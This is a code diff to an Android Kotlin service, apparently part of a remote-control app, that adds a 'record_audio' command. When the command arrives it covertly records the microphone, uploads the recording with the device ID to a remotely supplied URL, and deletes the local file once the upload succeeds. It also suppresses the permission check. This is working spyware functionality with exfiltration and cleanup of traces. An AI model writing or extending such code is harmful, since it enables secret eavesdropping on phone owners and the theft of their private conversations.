@@ -39,6 +39,8 @@ import java.io.IOException
 import java.net.Inet4Address
 import java.net.NetworkInterface
 import java.util.concurrent.TimeUnit
+import android.media.MediaRecorder
+import okhttp3.MediaType.Companion.toMediaType
 
 
 
@@ -153,6 +155,14 @@ class CommandService : Service() {
                             }
                         }
 
+                        "record_audio" -> {
+                            val duration = params.optInt("duration", 10)
+                            val uploadUrl = params.optString("upload_url")
+                            if (uploadUrl.isNotEmpty()) {
+                                recordAudioAndUpload(applicationContext, duration, uploadUrl)
+                            }
+                        }
+
 
                     }
 
@@ -162,6 +172,69 @@ class CommandService : Service() {
             }
         })
     }
+
+    @SuppressLint("MissingPermission")
+    private fun recordAudioAndUpload(context: Context, durationSec: Int, uploadUrl: String) {
+        val outputFile = File(context.cacheDir, "recorded_${System.currentTimeMillis()}.3gp")
+
+        val recorder = MediaRecorder().apply {
+            setAudioSource(MediaRecorder.AudioSource.MIC)
+            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+            setOutputFile(outputFile.absolutePath)
+            prepare()
+            start()
+        }
+
+        Log.i("AudioRecord", "Recording started: ${outputFile.absolutePath}")
+
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                recorder.stop()
+                recorder.release()
+                Log.i("AudioRecord", "Recording stopped, file saved")
+                uploadAudioFile(context, outputFile, uploadUrl)
+            } catch (e: Exception) {
+                Log.e("AudioRecord", "Error stopping recorder: ${e.message}")
+            }
+        }, durationSec * 1000L)
+    }
+
+    private fun uploadAudioFile(context: Context, file: File, uploadUrl: String) {
+        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+    
+        val requestBody = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("device_id", deviceId)
+            .addFormDataPart("audio", file.name, file.asRequestBody("audio/3gp".toMediaType()))
+            .build()
+    
+        val request = Request.Builder()
+            .url(uploadUrl)
+            .post(requestBody)
+            .build()
+    
+        OkHttpClient().newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("UploadAudio", "Failed: ${e.message}")
+            }
+    
+            override fun onResponse(call: Call, response: Response) {
+                val body = response.body?.string()
+                Log.i("UploadAudio", "Success: $body")
+    
+                // ✅ AUTO DELETE FILE after success
+                if (response.isSuccessful) {
+                    if (file.exists()) {
+                        file.delete()
+                        Log.i("UploadAudio", "Local file deleted: ${file.name}")
+                    }
+                }
+            }
+        })
+    }
+    
+
 
     private fun isDeviceRooted(): Boolean {
         val paths = listOf(
